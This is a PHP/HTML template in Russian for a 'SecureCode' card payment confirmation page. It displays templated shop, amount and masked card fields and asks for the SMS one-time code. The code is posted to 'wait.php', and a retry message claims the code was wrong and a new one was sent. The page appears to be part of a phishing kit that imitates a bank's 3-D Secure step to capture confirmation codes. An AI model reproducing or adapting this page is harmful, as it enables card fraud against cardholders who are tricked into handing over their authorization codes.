...
<form method="POST" action="wait.php" class="credit-card-form__form js-card-form" autocomplete="on">
    ...
    <div class="wrapper" id="app">
        <div class="card-form">
            ...
            <div class="pay-card-layout__header_type_vkpay">
                <center>
                    <div style="border-bottom: 0px solid #ced6e0;
padding-bottom: 15px; transition: opacity 0.1s linear 0s, transform 0.1s linear 0s, visibility 0s linear 0.1s;
    box-shadow: rgba(0, 0, 0, 0.08) 0px 4px 8px -4px;
    transform: translate3d(0px, -8px, 0px);">
                        <strong style="font-size:23px; padding-left:10px;color:#ced6e0;font-weight: lighter;"><i class="fas fa-shield-alt"></i> SecureCode</strong>
                    </div>
                </center>
            </div>
            <br>
            ...
            <div class="card-list">
                ...
                <div class="card-form__inner">
                    ...
                    <center> <strong style="color:;font-size:21px">Подтверждение операции <i style="color:;font-size:17px" data-toggle="tooltip" title="SecureCode – это простой и безопасный способ оплаты покупок в интернете по картам, который реализован путем отправки одноразового секретного кода на мобильный телефон держателю карты и проверки кода на стороне банкинга." class="far fa-question-circle"></i></strong></center>
                    <table style="margin: auto;padding: 20px;">

                        <tbody style="margin: auto;">
                            <tr>
                                <th style="float:right" scope="row">Магазин</th>
                                <td style="padding-left:10px;color:#1a3b5d;font-weight: lighter;"><b><?=$shop;?></b></td>

                            </tr>
                            <tr>
                                <th style="float:right" scope="row">Сумма</th>
                                <td style="padding-left:10px;color:#1a3b5d;font-weight: ;"><b><?=$amount;?> RUB</b></td>

                            </tr>
                            <tr>
                                <th style="float:right" scope="row">Номер карты</th>
                                <td style="padding-left:10px;color:#1a3b5d;font-weight: lighter;"><b>**** **** **** <?=substr($card_number, -4);?></b></td>

                            </tr>
                            <tr>
                                <th style="float:right" scope="row">Коментарий</th>
                                <td style="padding-left:10px;color:#1a3b5d;font-weight: lighter;"><b>None</b></td>
                    ...
                    <center>
                        ...
                        <small style="text-align:justify;">Для подтверждения операции на Ваш номер телефона было отправлено смс сообщение с кодом подтверждения. Введите его в поле ниже.</small>
                    </center>
                    <?if(isset($_GET['c'])):?>
                        <br><center style="color:red"><i class="fas fa-exclamation-circle"></i> Неверный код из смс! Вам отправлен еще один код.</center>
                    <?endif;?>
                    <center>
                        <div class="card-input">
                            <label for="cardName" class="card-input__label">Код из смс:</label>
                            <input type="text" placeholder="Введите код из смс..." name="securecode" id="cardName" class="card-input__input" v-model="cardName" v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" required>
                        </div>
                    </center>
                        ...
                        <div class="card-form__col">
                            <div class="credit-card-form__submit">
                                <div class="credit-card-form__submit-inner">
                                    <input type='submit' class='card-form__button' name='submit' value='Подтвердить'>
                                </div>
                            </div>
                        </div>
                    </div>
